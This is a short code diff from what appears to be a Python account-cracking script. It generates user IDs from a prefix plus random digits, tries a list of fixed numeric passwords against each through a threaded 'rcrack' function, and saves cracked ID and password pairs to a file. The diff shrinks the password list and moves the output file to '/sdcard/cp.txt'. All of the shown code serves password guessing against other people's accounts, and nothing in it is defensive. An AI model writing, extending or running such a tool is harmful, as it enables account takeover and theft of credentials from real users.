@@ -679,7 +679,7 @@ def random_number():
 		print(47*"-")
 		for guru in user:
 			uid = kode+guru
-			pwx = ['57273200','59039200','57575751','57575752']
+			pwx = ['57273200']
 			yaari.submit(rcrack,uid,pwx,tl)
 
 	print(47*"-")
@@ -955,7 +955,7 @@ def rcrack(uid,pwx,tl):
 
 				
 				
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				open('/sdcard/cp.txt', 'a').write(uid+'|'+ps+'\n')
 
 				cps.append(uid)
 
